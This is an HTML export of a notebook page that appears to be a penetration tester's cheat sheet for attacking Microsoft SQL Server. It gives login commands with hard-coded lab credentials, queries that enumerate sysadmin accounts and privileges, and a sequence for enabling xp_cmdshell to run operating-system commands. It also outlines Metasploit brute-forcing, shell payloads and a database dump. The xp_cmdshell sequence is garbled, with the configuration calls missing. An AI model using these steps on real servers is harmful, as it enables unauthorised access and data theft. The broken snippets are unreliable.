<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>microsft sql server</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>microsft sql server</h1><br/><p><strong><h3>## interact with Microsoft SQL server </h3></strong><ul><li><h3>• </h3>•  sqsh -S $target -U user</li><li> mssqlclient.py external_user:#p00Public3xt3rnalUs3r#@10.13.38.11</li><li>mssqlclient.py Administrator:Lab123@&quot;$target&quot; -windows-auth</li></ul></p><p>  </p><p> </p><p> <h3></h3></p><p><h3> </h3><strong><h3>## basic enum</h3></strong><h3></h3></p><p><h3></h3></p><p></p><p><div class="codebox"><pre><span style="color:#ff9d00;font-weight:700">select</span> @@version<span style="color:#ff9d00;font-weight:700">;</span><br />SELECT name FROM master..syslogins WHERE sysadmin = <span style="color:#3ad900;font-weight:400">&#39;1&#39;</span><span style="color:#ff9d00;font-weight:700">;</span>  <span style="color:#0088ff;font-weight:400">## get admin user </span><br />SELECT entity_name, permission_name FROM fn_my_permissions<span style="color:#ff9d00;font-weight:700">(</span>NULL, <span style="color:#3ad900;font-weight:400">&#39;SERVER&#39;</span><span style="color:#ff9d00;font-weight:700">);</span> <span style="color:#0088ff;font-weight:400">##enumerate my privileges to see if I am admin</span><br />SELECT name FROM master..sysdatabases<span style="color:#ff9d00;font-weight:700">;</span> <span style="color:#0088ff;font-weight:400">##list dbs </span><br />SELECT DB_NAME<span style="color:#ff9d00;font-weight:700">();</span> <span style="color:#0088ff;font-weight:400">#actual db </span><br />SELECT DB_NAME<span style="color:#ff9d00;font-weight:700">();</span> <span style="color:#0088ff;font-weight:400">#actual db </span></pre></div></p><p> </p><p><h3></h3></p><p><h3> </h3><strong><h3>## RCE (not patched version)</h3></strong><h3></h3></p><p><h3></h3><h3></h3></p><p><h3></h3><h1> </h1><div class="codebox"><pre>get RCE by enbling xp_cmdshell<br /> <br /> <span style="color:#ff9d00;font-weight:700">bash</span><br /> <br /> <span style="color:#ff9d00;font-weight:700">1&gt;</span>  N<span style="color:#3ad900;font-weight:400">&#39;show advanced options&#39;</span>, 1<br /> <span style="color:#ff9d00;font-weight:700">2&gt;</span> go<br /> Configuration option <span style="color:#3ad900;font-weight:400">&#39;show advanced options&#39;</span> changed from 1 to 1. Run the RECONFIGURE statement to install.<br /> <span style="color:#333333;font-weight:400">(return status = 0)</span><br /> <span style="color:#ff9d00;font-weight:700">1&gt;</span>  N<span style="color:#3ad900;font-weight:400">&#39;xp_cmdshell&#39;</span>, 1<br /> <span style="color:#ff9d00;font-weight:700">2&gt;</span> go<br /> Configuration option <span style="color:#3ad900;font-weight:400">&#39;xp_cmdshell&#39;</span> changed from 0 to 1. Run the RECONFIGURE statement to install.<br /> <span style="color:#333333;font-weight:400">(return status = 0)</span><br /> <span style="color:#ff9d00;font-weight:700">1&gt;</span> RECONFIGURE<br /> <span style="color:#ff9d00;font-weight:700">2&gt;</span> go<br /> ◇  RCE :<br /> <br /> <br />  xp_cmdshell <span style="color:#3ad900;font-weight:400">&#39;dir C:\&#39;</span><span style="color:#ff9d00;font-weight:700">;</span></pre></div></p><p> </p><p> <h3></h3></p><p><h3></h3></p><p><strong><h3>Exploit sp_execute_external_script</h3></strong><strong><h3></h3></strong></p><p><strong><h3>  (elevate privilege</h3></strong>)<ul><li> when a webserver is enabled to run the stored procedure </li></ul></p><p>sp_execute_external_script, and that it is configured to do that as a different user.</p><p>  </p><p></p><p></p><p><strong><h2>MSSQL shell </h2></strong><ul><li><h3>◇ </h3>◇ https://alamot.github.io/mssql_shell/</li></ul></p><p> ◇ rlwrap python script.py<h3></h3></p><p><h3> </h3></p><p><strong><h2>MSSQL methodology</h2></strong><ol><li>nmap --script ms-sql-info -p 1433 $target</li><li>bruteforce users and passwords : <ol><li>auxiliary/scanner/mssql/mssql_login</li></ol></li><li>get shell <ol><li>mssql_payload on metasploit</li></ol></li></ol></p><p></p><p></p><p></p><p><strong><h2>MSSQL dump database (connect)</h2></strong></p><p></p><p><ul><li>sqlcmd -U db_admin -p ‘password’ -Q ‘Use db_name; select * from table;’<ul><li>in windows command </p><p></li></ul></li></ul></p></div>
</body>
</html>
